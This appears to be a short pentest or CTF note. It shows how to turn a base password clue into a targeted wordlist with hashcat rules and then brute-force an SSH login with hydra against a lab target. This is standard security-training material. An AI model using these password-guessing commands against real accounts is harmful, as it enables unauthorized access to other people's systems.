## Concept

Instead of using a large generic wordlist, start with a **known password pattern/base word** and use Hashcat rules to generate many variations.

This is useful when you have clues about how a target may construct passwords, such as:

- Company/project name
- Season + year
- Username/company-related words
- Known password with different capitalization
- Numbers or special characters appended
    

---

## 1. Create a Base Wordlist

Create a file containing the known/base password:

```bash
echo "spring2026" > base.txt
```

`base.txt`:
```text
spring2026
```

---

## 2. Generate Password Variations

Use Hashcat in `--stdout` mode with a rule file:

```bash
hashcat --stdout base.txt \
  -r /usr/share/doc/hashcat/rules/dive.rule \
  > wordlist.txt
```
### What this does
- `--stdout` → generate candidates without cracking a hash
- `base.txt` → input wordlist
- `-r` → apply a Hashcat rule file
- `dive.rule` → collection of password transformation rules
- `>` → save generated candidates to `wordlist.txt`

The result can contain variations such as different capitalization, appended numbers, substitutions, and other transformations depending on the rules.

Check the generated list:

```bash
head wordlist.txt
wc -l wordlist.txt
```

---

## 3. Use the Generated List

For an authorized lab/CTF SSH target:

```bash
hydra -l jford -P wordlist.txt 10.x.x.x ssh -t 4
```
- `-l jford` → username
- `-P wordlist.txt` → password list
- `10.x.x.x` → target IP
- `ssh` → SSH protocol
- `-t 4` → 4 parallel tasks
    

---

## Workflow

```text
Known password clue
        ↓
     base.txt
        ↓
  Hashcat rules
        ↓
   wordlist.txt
        ↓
 Authorized login testing
```

### Key idea

**Don't always start with `rockyou.txt`.**

If you have a strong password clue, a small **targeted wordlist + rules** can be much more efficient than blindly testing millions of unrelated passwords.